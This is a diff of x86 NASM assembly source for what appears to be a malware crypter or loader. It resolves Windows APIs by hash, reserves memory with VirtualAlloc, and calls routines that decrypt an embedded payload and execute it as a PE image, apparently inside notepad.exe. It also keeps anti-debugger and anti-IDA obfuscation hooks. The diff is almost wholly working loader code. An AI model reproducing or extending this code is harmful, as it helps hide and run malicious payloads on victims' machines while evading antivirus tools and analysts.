@@ -2,6 +2,8 @@ align 16
 
 %include "macro.asm"
 %include "payload.inc"
+%include "structure.asm"
+
 
 section .data
 OLLY	dd RANDOM32
@@ -20,10 +22,11 @@ PEZOFHEADERS dd RANDOM32
 PEOPTHEADER dd RANDOM32
 PEBASE2 dd 0 
 SEH	dd _main + RANDOM16
+RAMSTRU dd RANDOM32
 
-FILE db 'C:\WINDOWS\system32\notepad.exe',0
+;#FILE db 'C:\WINDOWS\SysWOW64\notepad.exe',0
+FILE db 'C:\WINDOWS\notepad.exe',0
 
-;#%include "payload.inc"
 %include "hashs.inc"
 
 section .text
@@ -36,6 +39,7 @@ GLOBAL _start
 _start:
 	push ebp
 	mov	ebp,edi
+
 
 	%ifdef OBS
 	; Some work for IDA
@@ -50,7 +54,7 @@ _start:
 
 
 .ends
-
+  xor  eax,eax  ; pas nécessaire sous Xp
 	; Find egg SEH Handler
 	not eax ; au démarrage du PE eax = 0
 	sub dword [SEH],RANDOM16
@@ -97,14 +101,15 @@ _main:
 		
 		mov	ebp,esp
 
-		; Reserve Memory for the PE image
+		; Reserve Memory for the PE image, used structure  and all the stuff...
 		invokel _getdll,HASH_KERNEL32.DLL
 		invokel _getfunction, eax, HASH_VIRTUALALLOC
-		mov	ebx, dword[PELEN]
-		add	ebx, 1024 + 0x54 + 0x10	; Reserve plus de place pour SIS et PIS
+		mov	ebx, RAMSTRU__LEN
 		invokel eax, NULL, ebx, MEM_COMMIT, PAGE_READWRITE
 		mov	[PEBASE], eax ; Save memory location
 
+    ; Decipher the BBox 
+    call _bbdxor
 		; Decipher payload
 		call _bbdecypher
 		call _peexec
